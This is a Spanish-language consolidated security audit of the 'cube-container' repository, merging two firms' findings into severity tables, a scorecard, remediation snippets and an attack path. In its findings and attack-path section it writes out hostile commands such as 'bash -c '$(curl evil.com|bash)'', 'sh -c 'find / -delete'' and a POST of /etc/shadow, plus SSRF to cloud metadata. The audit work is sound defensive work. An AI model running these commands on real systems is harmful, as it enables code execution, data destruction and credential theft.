# 🎩 Auditoría Full-Stack Consensuada — Cube Container

## Sentinel Audit Group × Apex Forensics — Informe Unificado

**Repositorio:** `schwabauerbriantomas-gif/cube-container`
**Commit:** `744a445`
**Fecha:** 9 Julio 2026
**Alcance:** 2,085 archivos, ~384K líneas (Go + TS + Rust + Python)
**Metodología:** Dos firmas independientes con revisión cruzada + verificación arbitral

---

## Proceso de Consenso

Dos firmas auditaron el repositorio en paralelo, cada una con metodología propia:

| Firma | Fortaleza | Enfoque | Findings |
|-------|-----------|---------|----------|
| **Apex Forensics** | Profundidad | Lectura línea-por-línea de crypto/auth/injection, vectores de bypass concretos, attack paths end-to-end | 20 |
| **Sentinel Audit Group** | Amplitud | Git forensics, infraestructura (Caddy/Docker/Terraform), frontend, RBAC completeness, documentación | 22 |

### Correcciones Cruzadas Acordadas

1. **Sentinel→Apex:** Apex catalogó los binarios ELF como "supply chain risk" pero no analizó el git packfile. Sentinel demostró que hay **9+ blobs de 12MB** en `.git/objects/` — los binarios fueron commiteados repetidamente. **Apex acepta:** esto agrava el finding de S-003 a CRITICAL confirmado.

2. **Apex→Sentinel:** Sentinel marcó el exec allowlist como HIGH (S-07). Apex demostró **7 vectores de bypass concretos** (`sh -c 'find / -delete'`, `python3 -c "import socket..."`, `curl -X POST -d @/etc/shadow`). **Sentinel acepta:** la severidad correcta es CRITICAL, no HIGH.

3. **Sentinel→Apex:** Apex reportó el webhook SSRF pero no notó que el endpoint **no requiere API key**. Sentinel identificó que cualquier atacante que conozca la URL del webhook puede forzar git clones arbitrarios. **Apex acepta:** la severidad sube a HIGH confirmado.

4. **Apex→Sentinel:** Sentinel reportó el audit hash chain como "excelente" (9/10). Apex demostró que el campo `Tool` **no está incluido en el hash** — permite tampering indetectable. **Sentinel acepta:** el score baja a 7/10. *Nota arbitral: también falta `Reason`.*

5. **Sentinel→Apex:** Apex no verificó que **8 tools no tienen entrada en `toolPermissions`** — son inaccesibles en modo HTTP para cualquier rol. Sentinel identificó este bug funcional. **Apex acepta:** finding MEDIUM confirmado.

---

## Hallazgos Consolidados (27 findings únicos)

### 🔴 CRITICAL (3)

| ID | Consenso | Archivo | Descripción |
|----|----------|---------|-------------|
| **C-01** | Apex S-001/S-002 + Sentinel S-07 | `security.go:40-54` | **Exec allowlist permite RCE total.** Incluye `sh`, `bash`, `python`, `python3`, `node`, `curl`, `wget`, `nc`. El denylist es string-matching superficial con 7+ vectores de bypass verificados: `sh -c 'find / -delete'`, `bash -c '$(curl evil.com\|bash)'`, `python3 -c "import socket,subprocess..."`, `sh -c 'eval $(base64...)'`. Un operator puede ejecutar código arbitrario como root. |
| **C-02** | Apex S-003 + Sentinel S-01 | `Cubelet/cubelet` (93MB) + `mcp-server-go/mcp-server-go` (13MB) + `.git/objects/` | **Binarios ELF commiteados + contaminación de git history.** El binary-guard del CI no escanea `Cubelet/` raíz (solo `Cubelet/cmd`). El packfile contiene 9+ blobs de 12MB. Sin SBOM ni hash verification. Supply chain comprometido. |
| **C-03** | Apex S-012 + Sentinel S-02 | `LICENSE` vs `README.md:3` | **Conflicto de licencia.** LICENSE dice "Copyright (C) 2026 Tencent. All rights reserved." — README muestra badge "Apache 2.0". Legalmente ambiguo. Blocker para adopción enterprise y release público. |

### 🟠 HIGH (8)

| ID | Consenso | Archivo | Descripción |
|----|----------|---------|-------------|
| **H-01** | Apex S-004 + Sentinel S-10 | `secrets.go:42,193-214` | **PBKDF2 manual con 100K iteraciones.** OWASP 2023 recomienda 600K+. Sin memory-hardness. Implementación manual de crypto (anti-patrón). Salt fallback a hostname si `rand.Read` falla. |
| **H-02** | Apex S-005 | `auth.go:275-283` | **API keys en plaintext en disco.** `saveLocked()` escribe JSON sin cifrar. El proyecto tiene `SecretsManager` (AES-256-GCM) pero no lo usa para sus propias keys. |
| **H-03** | Apex S-006 + Sentinel S-13 | `security.go:221-283` | **SSRF: `isPrivateHost` no maneja IPv6 ni encoding alternativo.** Vulnerable a: IPv6 loopback `[::1]`, decimal `2130706433`, hex `0x7f000001`, octal `0177...`, IPv4-mapped IPv6 `[::ffff:127.0.0.1]`, DNS rebinding. |
| **H-04** | Apex S-007 | `volumes.go:525-531` | **SSH con `StrictHostKeyChecking=no`.** Vulnerable a MITM en primera conexión. `remoteVolRoot` derivado de env var, aunque `shellQuote` protege parcialmente. |
| **H-05** | Sentinel S-06 | `webhook.go:139-146` | **Webhook SSRF sin auth.** El endpoint no requiere API key. La URL se procesa async en goroutine. El atacante recibe 200 OK inmediato. Si `CUBE_ALLOW_INSECURE_GIT=true`, permite git clones a HTTP arbitrario. |
| **H-06** | Apex S-016 + Sentinel S-05 | `client.go:40` | **Default API key hardcoded `e2b_000000`.** Si `CUBE_API_KEY` no se setea, el servidor autentica contra CubeAPI con un valor público visible en código fuente. |
| **H-07** | Apex S-011 + Sentinel S-03 | `.github/workflows/ci.yml:111,118` | **Security scans no bloqueantes.** `gosec` y `govulncheck` tienen `continue-on-error: true`. Un PR con CVE conocido pasa CI verde. |
| **H-08** | Sentinel S-04 | `.github/workflows/ci.yml:77-84` | **`go vet` suprimido para Cubelet/CubeMaster.** El comando usa `2>/dev/null \|\| true` — silencia todo el output. Errores de locks copiados, shadowing, format strings nunca se detectan en código fork. |

### 🟡 MEDIUM (10)

| ID | Consenso | Archivo | Descripción |
|----|----------|---------|-------------|
| **M-01** | Apex S-008 | `auth.go:450-458` | **Audit hash chain omite `Tool` y `Reason`.** Permite cambiar `delete_volume` → `list_volumes` sin romper la cadena. Tampering indetectable. |
| **M-02** | Apex S-009 | `secrets.go:316-348` | **`RotateKey` no atómico.** Descifra todos los secrets a plaintext en memoria simultáneamente. Un crash deja el store inconsistente. |
| **M-03** | Apex S-010 + Sentinel S-08 | `auth.go:374-397` | **Rate limiter O(n) + memory leak.** Lock global bloquea todas las requests. El mapa `requests` nunca se limpia. Un atacante con múltiples tokens agota memoria. |
| **M-04** | Sentinel S-12 | `auth.go:36-198` vs `server.go` | **8 tools sin entrada en `toolPermissions`.** `canExecute()` retorna false (fail-closed) → 8 tools son inaccesibles en modo HTTP para cualquier rol, incluyendo admin. Bug funcional. |
| **M-05** | Apex S-013 + Sentinel S-14 | `web/src/lib/api.ts:35-36`, `session.ts:22` | **Tokens en localStorage.** API key y session token accesibles vía XSS. Debería usar cookies HttpOnly + SameSite=Strict. |
| **M-06** | Sentinel S-09 | `server.go:215` | **HA heartbeat sin auth obligatoria.** Si `CUBE_HA_SECRET` no está configurado, cualquier cliente puede spoofear heartbeats — prevenir o forzar failover arbitrario. |
| **M-07** | Sentinel S-14 + verificación arbitral | `web/src/locales/en/auth.json:13` | **Credenciales default admin/admin.** El hint en la UI dice "Default account: admin / admin". No hay.force-password-change en primer login. |
| **M-08** | Apex S-014 | `auth.go:286-303` | **Rate limit bypassable con múltiples keys.** El límite es por-key. Un admin comprometido crea N tokens → N×120 req/min. |
| **M-09** | Verificación arbitral | `auth.go:298-301` | **Race condition en `GenerateKey`.** `Unlock()` antes de `save()`. Entre unlock y RLock, writers concurrentes pueden modificar `ks.keys` — el save puede persistir estado inconsistente. |
| **M-10** | Apex S-018 + Sentinel S-11 | `README.md`, `server.go:2`, `CONTRIBUTING.md` | **Tool count inconsistente.** Badge: "129 tools", README body: "121 tools", CONTRIBUTING: "34 tools", código: 129 `s.AddTool`. Un agent que use `backend_info` (retorna 129) vs README (121) se confunde. |

### 🟢 LOW / INFO (6)

| ID | Consenso | Archivo | Descripción |
|----|----------|---------|-------------|
| **L-01** | Apex S-015 | `secrets.go:415-418` | AES cipher recreado en cada `encrypt()`/`decrypt()`. Cachear el `cipher.Block`. |
| **L-02** | Apex S-017 | `server.go` (1319 líneas) | server.go monolítico. Separar en main.go, tools.go, handlers.go. |
| **L-03** | Sentinel S-17 | `Caddyfile` WAF section | WAF regex bypasseable (`UNION/**/SELECT`, `%252e%252e%252f`). Solo analiza path, no body. |
| **L-04** | Sentinel S-18 | `docker_client.go:81-112` | Sin connection pooling configurable en DockerClient. |
| **L-05** | Sentinel S-19 | `CONTRIBUTING.md:40-42` | Dice que Docker requiere `-tags docker` — falso, compila sin tags. |
| **L-06** | Apex S-020 + Sentinel S-15 | `mcp-server-go/` | 6 test files para 41 source files. `secrets.go` (crypto) sin tests. Paths críticos sin cobertura. |

---

## Scorecard Consensuada

| Dimensión | Sentinel | Apex | **Consenso** | Delta |
|-----------|----------|------|-------------|-------|
| **Seguridad** | 6.5 | 4.5 | **5.0/10** | Las dos firmas difieren 2 pts. Apex encontró attack paths RCE concretos que justifican el score más bajo. Sentinel valoró más el diseño de RBAC/audit. El consenso reconoce ambos: el diseño es bueno, la implementación tiene holes explotables. |
| **Mantenibilidad** | 5.5 | 5.5 | **5.5/10** | Acuerdo total. Estructura por dominio es buena, pero server.go monolítico y tech debt documental. |
| **Agent Usability** | 8.5 | 7.0 | **8.0/10** | Ambos coinciden que es la fortaleza del proyecto. Naming consistente, self-discovery, descriptions ricas. |
| **Eficiencia** | 7.0 | 6.5 | **6.5/10** | Cercanos. Rate limiter O(n) y AES por-call son los puntos flojos. Dual backend y resource limits son los fuertes. |
| **Open-Source** | 4.5 | 4.5 | **4.5/10** | Acuerdo total. Blockers: licencia, binarios en git history, CI no bloqueante, coverage baja. |
| **Global** | 6.4 | 5.6 | **5.9/10** | |

---

## Top 7 — Acción Inmediata

### 1. 🔴 C-01: Remover sh/bash/nc/python/curl/wget del exec allowlist

```go
// security.go — eliminar del execAllowlist:
// "python", "python3", "node", "npm", "go", "cargo",
// "curl", "wget", "nc", "ss", "netstat",
// "sh", "bash",
// Para shells: si son necesarios, requerir CUBE_ALLOW_SHELL=true + logging de auditoría
```

### 2. 🔴 C-02: Purgar binarios + ampliar binary-guard

```bash
git rm --cached Cubelet/cubelet mcp-server-go/mcp-server-go
git filter-repo --path Cubelet/cubelet --invert-paths
git filter-repo --path mcp-server-go/mcp-server-go --invert-paths
git push --force --all
```

```yaml
# ci.yml — ampliar binary-guard:
for dir in mcp-server-go Cubelet CubeMaster cubelog .; do  # ← Cubelet raíz, no solo cmd/
```

### 3. 🔴 C-03: Resolver conflicto de licencia

```bash
# Si Apache 2.0: reemplazar LICENSE completo
# Si licencia Tencent modificada: corregir badge del README
# En ambos casos: añadir NOTICE file documentando el fork
```

### 4. 🟠 H-01: Migrar PBKDF2 a argon2id o subir a 600K iteraciones

```go
import "golang.org/x/crypto/argon2"
func deriveKeyFromPassphrase(passphrase string, salt []byte) []byte {
    return argon2.IDKey([]byte(passphrase), salt, 3, 64*1024, 4, 32)
}
```

### 5. 🟠 H-05: Cerrar webhook SSRF

```go
// 1. Validar URL ANTES de la goroutine
// 2. Requerir CUBE_WEBHOOK_SECRET obligatorio
if os.Getenv("CUBE_WEBHOOK_SECRET") == "" { reject all webhooks }
// 3. Rate limiting específico en el endpoint
```

### 6. 🟠 H-07+H-08: Hacer CI bloqueante

```yaml
# Remover continue-on-error: true de gosec, govulncheck
# Remover 2>/dev/null || true de go vet en Cubelet/CubeMaster
```

### 7. 🟡 M-01: Fix audit hash chain

```go
payload := fmt.Sprintf("%s|%s|%s|%s|%s|%d|%s|%v|%s|%s|%s",
    entry.Timestamp, entry.Key, entry.Role,
    entry.Method, entry.Path, entry.StatusCode,
    entry.Duration, entry.Allowed, entry.PrevHash,
    entry.Tool,    // ← añadir
    entry.Reason,  // ← añadir
)
```

---

## Attack Path Crítico (Consenso)

```
1. Atacante obtiene API key "operator" (o usa default e2b_000000 si CUBE_API_KEY no seteada)
2. Llama exec_in_container: bash -c '$(curl evil.com/payload.sh | bash)'
   → Allowlist: bash ✓ | Denylist: no match (no hay "| bash" literal, hay pipe dentro de $())
3. payload.sh descarga kernel exploit (Dirty Pipe, OverlayFS CVE)
4. Docker container comparte kernel host → escape
5. Desde host: lee /var/lib/cube-container/auth-keys.json (plaintext)
6. Usa secrets.key para descifrar secrets.json (AES-256-GCM)
7. Si hubo RotateKey previo: plaintexts residuales en memoria/swap
8. SSRF a 169.254.169.254 (no detectado por isPrivateHost) → credenciales cloud
9. Audit log muestra "list_volumes" en vez de "exec_in_container" (M-01: Tool no hasheado)
```

---

## Lo Que Cada Firma Aportó al Consenso

### Apex Forensics — Profundidad

- **7 vectores de bypass concretos** para el command allowlist (Sentinel solo reportó "bypass trivial")
- **RotateKey no atómico** con plaintexts en memoria (Sentinel no lo detectó)
- **SSH StrictHostKeyChecking=no** en volume_migrate (Sentinel no revisó volumes.go)
- **Audit hash omite Tool** — finding que bajó el score de audit de 9 a 7
- **3 attack paths trazados end-to-end**

### Sentinel Audit Group — Amplitud

- **Git history forensics** — 9+ blobs binarios en packfile (Apex solo vio working tree)
- **Webhook sin auth** — SSRF explotable sin credenciales (Apex no revisó webhook.go a fondo)
- **8 tools sin RBAC** — bug funcional confirmado (Apex no cruzó toolPermissions vs AddTool)
- **HA heartbeat sin auth** — failover spoofing (Apex no llegó a ha.go)
- **Caddyfile WAF bypass** — análisis de infraestructura (Apex se centró en Go)
- **Tool count: 3 números diferentes** — inconsistencia documental cross-referenciada

---

## Veredicto del Consenso

El proyecto tiene **el diseño de seguridad más maduro de lo típico para un fork** — RBAC con 3 roles, audit hash chain, timing-safe comparisons, SSRF básico, dual backend con auto-detección, y agent usability excelente (8/10). El esfuerzo de 4 rondas de auditoría previas (35+ issues cerrados) es evidente.

Pero **no está listo para release público**. Tres blockers:

1. **RCE vía exec allowlist** (C-01) — explotable por cualquier operator
2. **Supply chain comprometida** (C-02) — binarios en working tree + git history
3. **Licencia ambigua** (C-03) — legalmente arriesgado

Con las 7 acciones inmediatas aplicadas, el score proyectado sería **7.5/10** — competitive para open-source.

---

*Auditoría consensuada entre Sentinel Audit Group y Apex Forensics.*
*Arbitraje: Alfred 🎩*
